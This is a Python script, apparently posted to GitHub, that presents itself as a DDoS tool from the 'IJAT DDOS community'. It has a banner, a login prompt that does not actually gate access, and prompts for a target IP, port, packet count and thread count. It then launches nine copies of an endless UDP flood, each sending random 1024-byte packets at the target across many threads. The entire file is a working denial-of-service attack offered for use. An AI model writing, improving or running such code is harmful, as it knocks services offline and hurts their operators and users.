import random
import socket
import os,sys
import threading
import time

print("""\033[91m                      ANNOUNCEMENT!!!
WELCOME TO TOOLS BY Ijat Ultranen DON'T REMAKE ORIGIN TO THE XNXN DDOS IJAT COMMUNITY""")
print("\033[0m")
print("\033[94mCode By Ijat Ultamen| XNXNX IJAT DDOS | HAVE FUN")
print("\033[0m")
print("Tunggu 3 Detik Baca Dulu...")
time.sleep(3)

os.system("clear")
print("""\033[95m
 Tools By : Ijat Ultramen
 Github Post By : Ijat Ultramen
 ███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
""")

username = str(input("\033[94m[IJAT] \033[93mUsername:"))
password = str(input("\033[94m[IJAT] \033[93mPassword:"))
if password == "Ijat" and username == "Ijat":
    print ("Telah Masuk Sebagai Ultramen Ijat")
    time.sleep(1)

os.system("clear")
print("\033[92mConnecting To Tools Ijat [\033[97m•\033[92m]")
time.sleep(0.5)

nicknm = "Ultramen"
os.system("clear")

print("\033[0m")
ip = str(input("[•] Host/Ip: "))
port = int(input("[•] Port: "))
choice = str(input("[•] GasDdos?(gas/gak): "))
times = int(input("[•] Packets: "))
threads = int(input("[•] Threads: "))
os.system("clear")
def wibu():
	ddos = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(ddos,addr)
			print(i +" \033[95mIJAT COMMUNITY HAS ATTACKED A BAD SERVER %s Port %s" %(ip,port))
		except:
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu2():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu3():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu4():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu5():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")
			
def wibu6():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu7():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu8():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

def wibu9():
	ddos = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" IJAT COMMUNITY HAS ATTACKED A BAD SERVER  %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] SERVER HAS BEEN OFF!!!")

for y in range(threads):
	if choice == 'gas':
		th = threading.Thread(target = wibu)
		th.start()
		th = threading.Thread(target = wibu2)
		th.start()			
		th = threading.Thread(target = wibu3)
		th.start()		
		th = threading.Thread(target = wibu4)
		th.start()		
		th = threading.Thread(target = wibu5)
		th.start()		
		th = threading.Thread(target = wibu6)
		th.start()	
		th = threading.Thread(target = wibu7)
		th.start()		
		th = threading.Thread(target = wibu8)
		th.start()		
		th = threading.Thread(target = wibu9)
		th.start()		
